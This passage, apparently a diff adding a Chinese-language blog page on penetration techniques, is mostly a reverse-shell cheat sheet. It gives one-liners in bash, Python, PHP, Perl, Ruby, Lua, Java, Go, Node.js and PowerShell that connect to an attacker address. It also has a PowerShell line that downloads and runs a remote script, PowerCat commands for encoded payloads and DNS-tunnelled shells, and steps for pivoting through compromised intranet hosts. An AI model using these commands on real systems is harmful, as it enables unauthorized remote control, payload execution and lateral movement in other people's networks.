+<span class="token comment" spellcheck="true"># 习惯</span>
+nc -lvvp 9999
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>文件传输</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 一旦连接建立，数据流就会传入，接收文件</span>
+nc -lp 333 <span class="token operator">></span>1.txt
+<span class="token comment" spellcheck="true"># 发送文件内容</span>
+nc -nv 192.168.0.11 <span class="token operator">&lt;</span> test.txt -q 1    <span class="token comment" spellcheck="true">#参数 -q: 输出完成之后过1秒就断开</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>简易聊天</p>
+<pre class="line-numbers language-bash"><code class="language-bash">nc -l -p 8888
+
+nc -vn 192.168.0.11 8888
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>获取shell</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 参考：https://www.uedbox.com/post/54632</span>
+<span class="token comment" spellcheck="true"># https://www.secpulse.com/archives/76223.html</span>
+
+<span class="token comment" spellcheck="true">##### nc正向shell（正向shell -> 内网服务器之间）</span>
+1.目标主机监听：
+nc -lvvp 4444 -e /bin/bash <span class="token comment" spellcheck="true"># linux</span>
+nc -lvvp 4444 -e c:\\WINDOWS\system32\cmd.exe    <span class="token comment" spellcheck="true"># win</span>
+2.本机连接目标
+nc 192.168.1.11 4444
+
+
+<span class="token comment" spellcheck="true">##### nc反向shell</span>
+1.本机
+nc -lvvp 3333       
+2.目标机器执行
+nc 192.168.0.111 3333 -c /bin/bash    <span class="token comment" spellcheck="true"># Linux</span>
+nc 192.168.0.111 -e c:\\WINDOWS\system32\cmd.exe    <span class="token comment" spellcheck="true"># win</span>
+
+
+
+<span class="token comment" spellcheck="true">###### 如果目标主机没有nc，获取反向shell</span>
+<span class="token comment" spellcheck="true">###### 或者假如nc不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell</span>
+<span class="token comment" spellcheck="true"># bash反弹shell</span>
+/bin/bash -c <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.41.13/4444 0<span class="token operator">></span><span class="token operator">&amp;</span>1
+
+<span class="token comment" spellcheck="true"># bash反弹shell(TCP)</span>
+目标机器： <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.41.133/4444 0<span class="token operator">></span><span class="token operator">&amp;</span>1
+攻击方： nc -lvvp 4444
+
+<span class="token comment" spellcheck="true"># bash反弹shell(UDP)</span>
+目标机器： <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.41.133/4444 0<span class="token operator">></span><span class="token operator">&amp;</span>1
+攻击方监听： nc -u -lvp 4444
+
+
+
+
+<span class="token comment" spellcheck="true"># python反向shell</span>
+// 方法一
+$ python -c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect<span class="token variable"><span class="token punctuation">((</span>"<span class="token number">10.0</span>.<span class="token number">0.1</span>"<span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">))</span></span>;os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+
+// 方法二
+$ <span class="token function">export</span> RHOST<span class="token operator">=</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token function">export</span> RPORT<span class="token operator">=</span>12345<span class="token punctuation">;</span>python -c <span class="token string">'import sys,socket,os,pty;s=socket.socket();s.connect<span class="token variable"><span class="token punctuation">((</span>os.getenv<span class="token punctuation">(</span>"RHOST"<span class="token punctuation">)</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>os.getenv<span class="token punctuation">(</span>"RPORT"<span class="token punctuation">))</span></span>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span>
+<span class="token comment" spellcheck="true"># windows python反弹shell</span>
+C:\Python27\python.exe -c <span class="token string">"(lambda __y, __g, __contextlib: [[[[[[[(s.connect<span class="token variable"><span class="token punctuation">((</span>'<span class="token number">10.11</span>.<span class="token number">0.37</span>'<span class="token punctuation">,</span> <span class="token number">4444</span><span class="token punctuation">))</span></span>, [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [<span class="token variable"><span class="token punctuation">((</span>s.close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lambda after<span class="token operator">:</span> after<span class="token punctuation">(</span><span class="token punctuation">))</span></span>[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [<span class="token variable"><span class="token punctuation">((</span>p.wait<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>lambda __after<span class="token operator">:</span> __after<span class="token punctuation">(</span><span class="token punctuation">))</span></span>)[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])<span class="token variable"><span class="token punctuation">((</span>lambda f<span class="token operator">:</span> <span class="token punctuation">(</span>lambda x<span class="token operator">:</span> x<span class="token punctuation">(</span>x<span class="token punctuation">))</span></span>(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"</span>
+
+
+
+<span class="token comment" spellcheck="true"># php反向shell</span>
+php -r <span class="token string">'<span class="token variable">$sock</span>=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'</span>
+
+
+
+<span class="token comment" spellcheck="true"># Perl反向shell</span>
+perl -e <span class="token string">'use Socket;<span class="token variable">$i</span>="10.0.0.1";<span class="token variable">$p</span>=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(<span class="token variable">$p</span>,inet_aton(<span class="token variable">$i</span>)))){open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");};'</span>
+<span class="token comment" spellcheck="true">#</span>
+perl -MIO -e <span class="token string">'<span class="token variable">$p</span>=fork;exit,if(<span class="token variable">$p</span>);<span class="token variable">$c</span>=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen(<span class="token variable">$c</span>,r);$~->fdopen(<span class="token variable">$c</span>,w);system<span class="token variable">$_</span> while&lt;>;'</span>
+<span class="token comment" spellcheck="true">#NOTE: Windows only</span>
+perl -MIO -e <span class="token string">'<span class="token variable">$c</span>=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen(<span class="token variable">$c</span>,r);$~->fdopen(<span class="token variable">$c</span>,w);system<span class="token variable">$_</span> while&lt;>;'</span>
+
+
+
+
+<span class="token comment" spellcheck="true"># Ruby反向shell</span>
+ruby -rsocket -e<span class="token string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d >&amp;%d 2>&amp;%d",f,f,f)'</span>
+<span class="token comment" spellcheck="true">#不依赖于/bin/sh的反弹shell</span>
+ruby -rsocket -e <span class="token string">'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span>
+<span class="token comment" spellcheck="true">#如果目标系统运行Windows反弹shell</span>
+ruby -rsocket -e <span class="token string">'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span>
+
+
+
+<span class="token comment" spellcheck="true"># Lua反向shell</span>
+<span class="token comment" spellcheck="true">#Linux</span>
+lua -e <span class="token string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3');"</span>
+<span class="token comment" spellcheck="true">#Windows</span>
+lua5.1 -e <span class="token string">'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, '</span>r<span class="token string">') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'</span>
+
+
+
+
+<span class="token comment" spellcheck="true"># Java反弹shell</span>
+r <span class="token operator">=</span> Runtime.getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span> p <span class="token operator">=</span> r.exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span>,<span class="token string">"-c"</span>,<span class="token string">"exec 5&lt;>/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \<span class="token variable">$line</span> 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">]</span> as String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> p.waitFor<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+
+<span class="token comment" spellcheck="true"># socat反弹shell</span>
+socat exec:<span class="token string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:192.168.79.137:5555
+
+
+
+
+<span class="token comment" spellcheck="true"># Golang反弹shell</span>
+<span class="token keyword">echo</span> <span class="token string">'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'</span> <span class="token operator">></span> /tmp/t.go <span class="token operator">&amp;&amp;</span> go run /tmp/t.go <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> /tmp/t.go
+
+
+
+<span class="token comment" spellcheck="true"># Telnet反弹shell</span>
+<span class="token function">rm</span> -f /tmp/p<span class="token punctuation">;</span> <span class="token function">mknod</span> /tmp/p p <span class="token operator">&amp;&amp;</span> telnet ATTACKING-IP 80 0/tmp/p
+<span class="token comment" spellcheck="true">#获取反弹shell后，可使用python获得交互式shell</span>
+python -c<span class="token string">'import pty; pty.spawn("/bin/bash")'</span> python -c <span class="token string">''</span><span class="token string">' import pty while(1):     try:         pty.spawn("/bin/bash")     except :         contiune'</span><span class="token string">''</span>
+
+
+
+<span class="token comment" spellcheck="true"># Nodejs反弹shell</span>
+<span class="token punctuation">(</span>function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    var net <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">"net"</span><span class="token punctuation">)</span>,
+        <span class="token function">cp</span> <span class="token operator">=</span> require<span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span>,
+        sh <span class="token operator">=</span> cp.spawn<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    var client <span class="token operator">=</span> new net.Socket<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    client.connect<span class="token punctuation">(</span>8080, <span class="token string">"10.17.26.64"</span>, function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        client.pipe<span class="token punctuation">(</span>sh.stdin<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        sh.stdout.pipe<span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        sh.stderr.pipe<span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> /a/<span class="token punctuation">;</span> // Prevents the Node.js application form crashing
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+or
+require<span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span>.exec<span class="token punctuation">(</span><span class="token string">'nc -e /bin/sh [IPADDR] [PORT]'</span><span class="token punctuation">)</span>
+or
+-var x <span class="token operator">=</span> global.process.mainModule.require
+-x<span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span>.exec<span class="token punctuation">(</span><span class="token string">'nc [IPADDR] [PORT] -e /bin/bash'</span><span class="token punctuation">)</span>
+or
+https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
+
+
+
+
+<span class="token comment" spellcheck="true"># ncat反向shell</span>
+ncat 127.0.0.1 4444 -e /bin/bash
+ncat --udp 127.0.0.1 4444 -e /bin/bash
+<span class="token comment" spellcheck="true"># 加密</span>
+A:  ncat -c <span class="token function">bash</span> -allow 192.168.1.20 -vnl 3333 --ssl  <span class="token comment" spellcheck="true">#被控端(服务器端)   -allow允许连接的ip， 端口, ssl加密</span>
+B:  ncat -nv 192.168.1.19 3333 --ssl      <span class="token comment" spellcheck="true">#攻击端</span>
+<span class="token comment" spellcheck="true"># 监听端口</span>
+ncat -lvvp 777
+
+
+<span class="token comment" spellcheck="true"># OpenSSL反弹shell</span>
+
+
+
+
+<span class="token comment" spellcheck="true"># crontab反弹shell</span>
+
+
+
+
+<span class="token comment" spellcheck="true"># MSF生成反弹shell</span>
+
+
+
+
+<span class="token comment" spellcheck="true"># Powershell反弹shell</span>
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient<span class="token punctuation">(</span><span class="token string">"[IPADDR]"</span>,<span class="token punctuation">[</span>PORT<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span> <span class="token operator">=</span> <span class="token variable">$client</span>.GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token variable">$bytes</span> <span class="token operator">=</span> 0<span class="token punctuation">..</span>65535<span class="token operator">|</span>%<span class="token punctuation">{</span>0<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token variable"><span class="token punctuation">((</span>$i <span class="token operator">=</span> $stream.Read<span class="token punctuation">(</span>$bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $bytes.Length<span class="token punctuation">))</span></span> -ne 0<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="token punctuation">)</span>.GetString<span class="token punctuation">(</span><span class="token variable">$bytes</span>,0, <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback</span> <span class="token operator">=</span> <span class="token punctuation">(</span>iex <span class="token variable">$data</span> 2<span class="token operator">></span><span class="token operator">&amp;</span>1 <span class="token operator">|</span> Out-String <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback2</span>  <span class="token operator">=</span> <span class="token variable">$sendback</span> + <span class="token string">"PS "</span> + <span class="token punctuation">(</span>pwd<span class="token punctuation">)</span>.Path + <span class="token string">"> "</span><span class="token punctuation">;</span><span class="token variable">$sendbyte</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>text.encoding<span class="token punctuation">]</span>::ASCII<span class="token punctuation">)</span>.GetBytes<span class="token punctuation">(</span><span class="token variable">$sendback2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span>.Write<span class="token punctuation">(</span><span class="token variable">$sendbyte</span>,0,<span class="token variable">$sendbyte</span>.Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span>.Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$client</span>.Close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true"># 或</span>
+powershell -nop -c <span class="token string">"<span class="token variable">$client</span> = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);<span class="token variable">$stream</span> = <span class="token variable">$client</span>.GetStream();[byte[]]<span class="token variable">$bytes</span> = 0..65535|%{0};while<span class="token variable"><span class="token punctuation">((</span>$i <span class="token operator">=</span> $stream.Read<span class="token punctuation">(</span>$bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $bytes.Length<span class="token punctuation">))</span></span> -ne 0){;<span class="token variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="token variable">$bytes</span>,0, <span class="token variable">$i</span>);<span class="token variable">$sendback</span> = (iex <span class="token variable">$data</span> 2>&amp;1 | Out-String );<span class="token variable">$sendback2</span> = <span class="token variable">$sendback</span> + 'PS ' + (pwd).Path + '> ';<span class="token variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="token variable">$sendback2</span>);<span class="token variable">$stream</span>.Write(<span class="token variable">$sendbyte</span>,0,<span class="token variable">$sendbyte</span>.Length);<span class="token variable">$stream</span>.Flush()};<span class="token variable">$client</span>.Close()"</span>
+<span class="token comment" spellcheck="true"># 或</span>
+powershell IEX <span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">'https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1'</span><span class="token punctuation">)</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>内网代理</strong></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 场景：通过拿到的一台能访问的内网主机1，作为跳板(vps不能直接访问内网主机2)，拿到另外一台内网主机1才能访问到的内网主机2的shell</span>
+<span class="token comment" spellcheck="true"># vps监听</span>
+nc -lvp 3333
+<span class="token comment" spellcheck="true"># 内网主机2执行</span>
+nc -lvp 3333 -e /bin/bash
+<span class="token comment" spellcheck="true"># 内网主机1(边界服务器)执行</span>
+nc -v vps_ip -c <span class="token string">"nc -v 内网主机2_ip 3333"</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="3-PowerCat"><a href="#3-PowerCat" class="headerlink" title="3.PowerCat"></a>3.PowerCat</h4><blockquote>
+<p>可以说是nc的powershell版本</p>
+</blockquote>
+<p>下载地址：<a href="https://github.com/besimorhino/powercat.git" target="_blank" rel="noopener">https://github.com/besimorhino/powercat.git</a></p>
+<h6 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h6><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 导入模块</span>
+Import-Moudle .\powercat.ps1
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>既然说是nc的powershell版本，那就可以与nc配合连接:<br>1.通过nc正向连接powercat</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 目标机器用powercat监听</span>
+powercat -l -p 8080 cmd.exe -v
+<span class="token comment" spellcheck="true"># 攻击机连接</span>
+nc 192.168.56.130 8080 -vv
+
+<span class="token comment" spellcheck="true">#参数</span>
+-l    <span class="token comment" spellcheck="true"># 监听</span>
+-p    <span class="token comment" spellcheck="true"># 指定端口</span>
+-c    <span class="token comment" spellcheck="true"># 指定要启动进程的名字</span>
+-v    <span class="token comment" spellcheck="true"># 显示详情</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>2.通过nc反向连接powercat</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 攻击机器监听</span>
+nc -lvv -p 8888
+<span class="token comment" spellcheck="true"># 目标机器用powercat连接我们</span>
+powercat -c 192.168.56.129 -p 8888 -v -e cmd.exe
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>通过powercat返回powershell</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 如果想返回powershell，就无法与nc进行交互</span>
+<span class="token comment" spellcheck="true"># 建立正向shell</span>
+
+<span class="token comment" spellcheck="true"># 在目标机器执行</span>
+IEX<span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">"http://10.10.10.1/powercat.ps1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+powercat -l -p 9999 -v
+<span class="token comment" spellcheck="true"># 在客户端</span>
+powercat -c 10.10.10.129 -p 9999 -v -ep  <span class="token comment" spellcheck="true"># -ep用于返回powershell</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>通过powercat传递文件</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 服务端准备接收文件</span>
+powercat -l -p 9999 -of test.txt -v    <span class="token comment" spellcheck="true"># -of 输出文件名</span>
+powercat -c 10.10.10.129 -p 9999 -i c:\1.txt -v  <span class="token comment" spellcheck="true"># -i 输入：可写文件名，也可直接写字符串</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>用powercat生成payload</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 有正向、反向，且可以进行编码</span>
+
+<span class="token comment" spellcheck="true">##</span>
+<span class="token comment" spellcheck="true"># 客户端生成</span>
+powercat -l -p 8888 -e cme -v -g <span class="token operator">>></span>shell.ps1   <span class="token comment" spellcheck="true"># 生成反弹shell的脚本</span>
+<span class="token comment" spellcheck="true">#或者生成反弹powershell的脚本</span>
+powercat -l -p 7777 -ep -v -g <span class="token operator">>></span>shell2.ps1
+<span class="token comment" spellcheck="true"># 把生成的文件上传到目标并运行</span>
+<span class="token comment" spellcheck="true"># 然后在客户端执行</span>
+powercat -c 10.10.10.129 -p 8888 -v  <span class="token comment" spellcheck="true"># 就会获得一个反弹shell</span>
+
+
+<span class="token comment" spellcheck="true">## 也可生成编码的payload</span>
+<span class="token comment" spellcheck="true"># 客户端运行</span>
+powercat -c 10.10.10.129 -p 6666 -ep -ge    <span class="token comment" spellcheck="true"># -ge  生成经过编码的payload</span>
+<span class="token comment" spellcheck="true"># 目标运行</span>
+powershell -E <span class="token string">"上面的编码"</span>
+<span class="token comment" spellcheck="true"># 继续客户端执行</span>
+powercat -l -p 9999 -v
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>PowerCat DNS隧道通信</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 由于其dns隧道是基于dnscat设计的，所以先下载安装编译它(放在目标机器Linux)</span>
+<span class="token comment" spellcheck="true"># 下载地址：https://github.com/iagox86/dnscat2</span>
+<span class="token function">git</span> clone https://github.com/iagox86/dnscat2
+<span class="token function">cd</span> dnscat2/server/
+gem <span class="token function">install</span> bundler
+bundle <span class="token function">install</span>
+
+
+<span class="token comment" spellcheck="true"># 然后，目标机器执行</span>
+ruby dnscat2.rb ttpowercat.test -e <span class="token function">open</span> --no-cache
+<span class="token comment" spellcheck="true"># 回到我们的机器，执行</span>
+powercat -c 192.168.56.129 -p 53 -dns ttpowercat.tect -e cmd.exe  <span class="token comment" spellcheck="true"># -dns表示使用dns进行通信</span>
+<span class="token comment" spellcheck="true"># 然后就能看到反弹回来的shell了</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>将powercat作为跳板</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 情景：vps可访问win7,但不能访问win server08 win7可访问win server08</span>
+<span class="token comment" spellcheck="true"># 以win7为跳板，来实现vps对win server08的访问</span>
+
+<span class="token comment" spellcheck="true">### F1</span>
+<span class="token comment" spellcheck="true">#1.在win server08执行</span>
+powercat -l -v -p 9999 -e cmd.exe
+<span class="token comment" spellcheck="true">#2.在win7(跳板)执行</span>
+powercat -l -v -p 8000 -r tcp:10.10.10.129:9999
+<span class="token comment" spellcheck="true">#3.vps上，连接win7</span>
+nc 192.168.56.130 8000 -vv  <span class="token comment" spellcheck="true"># 连接成功</span>
+
+
+<span class="token comment" spellcheck="true">### F2. 使用DNS协议</span>
+<span class="token comment" spellcheck="true">#1. win7上</span>
+powercat -l -p 8000 -r dns:192.168.56.129::ttpowercat.test     <span class="token comment" spellcheck="true"># 指定vps的地址</span>
+<span class="token comment" spellcheck="true">#2. vps上执行，启动dnscat</span>
+ruby dnscat2.rb ttpowercat.test -e <span class="token function">open</span> --no-cache
+<span class="token comment" spellcheck="true">#3. win server08(目标机器)</span>
+powercat -c 10.10.10.128 -p 8000 -v -e cmd.exe
+<span class="token comment" spellcheck="true"># 就可以看到反弹shell了</span>
+
+
+
+powercat更多用法
+```bash
+<span class="token comment" spellcheck="true"># https://github.com/besimorhino/powercat</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title=" 应用层隧道技术"></a><font color="red"> 应用层隧道技术</font></h2><blockquote>
+<p>使用较多</p>
+</blockquote>
+<h4 id="1-SSH隧道"><a href="#1-SSH隧道" class="headerlink" title="1.SSH隧道"></a>1.SSH隧道</h4><p>参数</p>
+<pre class="line-numbers language-bash"><code class="language-bash">-C    <span class="token comment" spellcheck="true"># 压缩传输(提高传输速度)</span>
+-f    <span class="token comment" spellcheck="true"># 后台执行</span>
+-N    <span class="token comment" spellcheck="true"># 静默连接(建立了链接，但是看不到具体会话)</span>
+-g    <span class="token comment" spellcheck="true"># 允许远程主机链接本地用于转发的端口</span>
+-L    <span class="token comment" spellcheck="true"># 本地端口转发</span>
+-R    <span class="token comment" spellcheck="true"># 远程端口转发</span>
+-D    <span class="token comment" spellcheck="true"># 动态转发(SOCKS代理)</span>
+-P    <span class="token comment" spellcheck="true"># 指定SSH端口</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>SSH配置文件</p>
